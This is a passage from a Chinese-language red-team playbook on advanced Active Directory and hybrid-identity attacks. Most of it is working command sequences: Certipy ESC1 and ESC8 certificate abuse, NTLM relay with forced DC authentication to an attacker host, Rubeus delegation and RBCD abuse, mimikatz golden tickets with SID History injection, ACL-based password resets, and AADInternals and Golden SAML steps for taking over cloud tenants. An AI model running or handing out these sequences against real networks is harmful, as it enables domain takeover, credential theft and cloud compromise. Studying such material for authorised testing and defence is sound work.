## 六、AD 高级攻击深化

### 6.1 ADCS 证书服务攻击全谱（ESC1-ESC16）

ADCS 是 2024-2026 年**最高产的域提权面**：83% 的 AD 渗透在数小时到 Domain Admin，ADCS 路径常常一步到位且绕过口令爆破。

```bash
# Certipy 5.1.0（支持 ESC1-ESC16 全谱检测与利用）
certipy find -u <EMAIL-REDACTED> -p pass -dc-ip 10.0.0.1 -vulnerable -stdout
# 常见漏洞模板：
# ESC1: 客户端认证 + 请求者可指定 SAN
# ESC2: Any Purpose 模板（可伪造任意用途证书）
# ESC3: 代理注册 + 注册代理模板组合
# ESC4: 低权限可写模板 ACL → 改模板再利用 ESC1
# ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 标志开启
# ESC8: NTLM Relay 到 CA 的 HTTP 注册端点（certfnsh.asp）
# ESC9/ESC10: 强认证与 NTAuth 相关（需配合客户端认证绕过）
# ESC13: 模板中嵌入 CA 证书模板可指定组（组内用户可申请）
# ESC14: 证书映射攻击（同名 SAN 映射）
# ESC15: 弱加密签名等
# ESC16: 新的证书映射绕过面

# ESC1 利用（以域管身份申请证书）
certipy req -u <EMAIL-REDACTED> -p pass -target 10.0.0.1 -ca 'CORP-CA' \
  -template 'VulnTemplate' -upn '<EMAIL-REDACTED>' -out admin.pfx
# 用证书做 PKINIT 认证（无需域管密码）
certipy auth -pfx admin.pfx -dc-ip 10.0.0.1 -domain corp.local
# 输出 NTLM hash 后 PTH → DCSync

# ESC8：NTLM Relay 到 ADCS HTTP 注册端点（配合 Coercer 触发 DC 认证）
ntlmrelayx.py -t http://10.0.0.1/certsrv/certfnsh.asp -smb2support --adcs \
  --template 'DomainController'
coercer coerce -u user -p pass -t 10.0.0.1 -l 10.0.0.50   # 胁迫 DC 向攻击机认证
```

**Certighost（CVE-2026-54121）——2026-07 新增 ADCS 高危**：
- 类型：ADCS enrollment chase 回退缺陷，**与模板配置无关**（默认 `Machine` 模板 + 企业 CA 即可）
- 影响：低权限域用户诱导 CA 为**任意域控制器**签发身份证书 → PKINIT 冒充 DC → DCSync → Golden Ticket 全域接管
- CVSS 8.8，微软 2026-07-14 补丁，2026-07-24 公开 PoC（GitHub: aniqfakhrul/CVE-2026-54121）
- 意义：打破"模板合规即安全"的防御思维定式；**审计 CA 需同时检查补丁状态与历史证书请求中的 chase 属性**

### 6.2 委派滥用（非约束/约束/RBCD）

```bash
# 非约束委派（Unconstrained Delegation）——持有用户的 TGT 可长期窃用
# 发现：BloodHound 查 unconstraineddelegation 或
ldapsearch -x -H ldap://10.0.0.1 -b "DC=corp,DC=local" \
  "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" sAMAccountName
# 利用：Rubeus monitor 等待高权限用户访问 → 抓取 TGT（诱骗访问：SpoolSample/PetitPotam 胁迫 DC 认证到委派主机）
Rubeus.exe monitor /interval:5 /nowrap
SpoolSample.exe 10.0.0.1 <delegation-host>   # 胁迫 DC 向委派主机认证

# 约束委派（Constrained Delegation）——可伪造指定服务的 TGS
Rubeus.exe s4u /user:svc_web /rc4:HASH /impersonateuser:administrator \
  /msdsspn:cifs/dc.corp.local /ptt

# 基于资源的约束委派（RBCD，T1558.002 变体）——控制目标机器账户即可
# 前提：对目标计算机有 GenericWrite 或已控机器账户
impacket-addcomputer corp.local/user:pass -computer-name 'evil$' \
  -computer-pass 'EvilPass123' -dc-ip 10.0.0.1
impacket-rbcd -delegate-to 'dc.corp.local' -delegate-from 'evil$' \
  corp.local/user:pass -action write -dc-ip 10.0.0.1
Rubeus.exe s4u /user:evil$ /rc4:HASH /impersonateuser:administrator /msdsspn:host/dc.corp.local /ptt
impacket-psexec -k -no-pass corp.local/<EMAIL-REDACTED>
```

### 6.3 信任关系攻击

```bash
# 域/林信任枚举
nltest /domain_trusts /all_trusts
impacket-getTGT corp.local/user:pass -dc-ip 10.0.0.1
# 跨域/跨林横向（用当前域 TGT 访问对方域资源）
impacket-psexec -k -no-pass corp.local/<EMAIL-REDACTED>
# SID History 注入（跨域提权，需域管权限）
mimikatz # kerberos::golden /user:evil /domain:corp.local /sid:S-1-5-21-xxx \
           /sids:S-1-5-21-yyy-512 /krbtgt:HASH /ptt   # 注入对方域 Domain Admins SID
# 利用信任：子域域管（非企业域管）通过 SID History 提权到父域
# 林间信任 + 认证服务路径（CVE-2022-33679、SID History 变体等）持续跟进
```

### 6.4 ACL 滥用（BloodHound 定位的精细化攻击）

| ACL 权限 | 滥用效果 | 工具 |
|---------|---------|------|
| GenericAll/GenericWrite（对象） | 重置密码/添加 SPN/写属性 | PowerView/impacket |
| WriteDACL/WriteOwner | 改写对象 ACL → 自我授权 | BloodyAD |
| ForceChangePassword | 直接改目标密码 | PowerView `Set-DomainUserPassword` |
| AddMember（组） | 把自己加入特权组 | PowerView `Add-DomainGroupMember` |
| GenericWrite（计算机） | 配置 RBCD 后门 | 见 6.2 |

```powershell
# PowerView 重置目标密码（GenericAll on user）
Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
# BloodyAD（Linux 端 ACL 滥用，无需域内主机）
bloodyAD --host 10.0.0.1 -d corp.local -u user -p pass add genericAll target_user
bloodyAD --host 10.0.0.1 -d corp.local -u user -p pass set password target_user NewPass123!
```

### 6.5 认证胁迫与 NTLM Relay 新原语（2025-2026 情报）

**认证胁迫（Coercion）——让高权限主机主动向攻击机认证：**
```bash
# PetitPotam / PrinterBug / DFSCoerce / Coercer（统一化框架）
coercer coerce -u user -p pass -t 10.0.0.1 -l 10.0.0.50 --listener 10.0.0.50
```

**2025-2026 NTLM 攻击演进（重要更新）：**
- **CVE-2025-33073（NTLM Reflection）**：反射攻击绕过 SMB 签名限制的新原语，2026 年研究持续产出新利用面；2026-01 Depth Security 的 Impacket fork 剥离 NTLMSSP SIGN/SEAL 标志同时保留 MIC，把 Reflection 扩展到 **LDAP/LDAPS** 及部分 RPC（任务计划器）
- **CVE-2025-24054**：`.library-ms` 恶意文件夹触发 NTLM Hash 泄露，已入 CISA KEV（2025-03）
- **CVE-2025-54918**：胁迫+中继组合，篡改 NTLM 消息字段绕过 LDAP 签名与通道绑定
- **CVE-2026-32202**：LNK 文件零点击认证胁迫（APT28 零日的不完整补丁，Akamai 2026-04 披露）
- **微软 NTLM 淘汰时间线**：2026-10 自动阻断 NTLMv1 SSO；NTLMv2 仅标记 deprecated——**红队需将 NTLM 利用视为"时效窗口"，同时把 Kerberos 与证书攻击作为主路径**

### 6.6 混合身份攻击（本地 AD ↔ Azure AD/Entra ID）

混合身份是 2025-2026 年 APT 从本地打到云的**主路径**（约 65% 初始访问是身份驱动而非恶意软件驱动）：

```
Stage 1  打点本地：Kerberoast/NTLM Relay/ADFS 代理 → 拿到 ADFS 服务账户或域管
Stage 2  提取签名密钥：ADFSDump（提取加密 PFX）+ DKM 密钥（AD 中解密）
Stage 3  伪造令牌：ADFSpoof / shimit 离线伪造任意用户的 SAML 断言（Golden SAML）
Stage 4  云端行动：加联邦域/OAuth 应用授权/后门 Service Principal/Graph API 窃取
```

**Entra Connect 同步攻击（高价值单点）：**
```powershell
# AADInternals 套件
Install-Module AADInternals
Get-AADIntTenantID -Domain corp.com            # tenant 侦察（无需凭据）
# 渗透 Entra Connect 服务器（通常 Domain Admin 权限）→
Get-ADIntPassword  msDS-ManagedPassword         # 提取同步账户(MSOL_)明文密码
# 用 MSOL_ 账户做云端 DCSync 式操作 / 重置云端用户密码（2025-09 微软披露真实攻击：非人类同步身份+全局管理员无 MFA → 重置密码→同步回云端）
# PTA Agent 后门：注入 DLL Hook LogonUserW（PTASpy）→ 记录全部云端登录口令
# Seamless SSO 漂移：改 azureADSSO 账户密码 → 云端登录降级
```

**其他混合身份面：**
- **Golden SAML**（T1606.002）：拿 ADFS token-signing 私钥 → 伪造任意用户 SAML → 绕过密码/MFA，密码重置无效
- **Silver SAML**：伪造特定服务（如 O365）的 SAML
- **OAuth 应用授权滥用**：诱管理员授权恶意应用 → 用应用权限读邮箱/Graph
- **Storm-0558 教训**：IdP 私钥泄露 → 任意 token 伪造；红队报告应提醒云侧签名密钥的防护
- **云侧横向**：本地域管 → Entra Connect → 云端全局管理员（Azure MFA 强制 Phase 2 2025-10 后注意服务主体/工作负载身份不受影响，仍是攻击面）

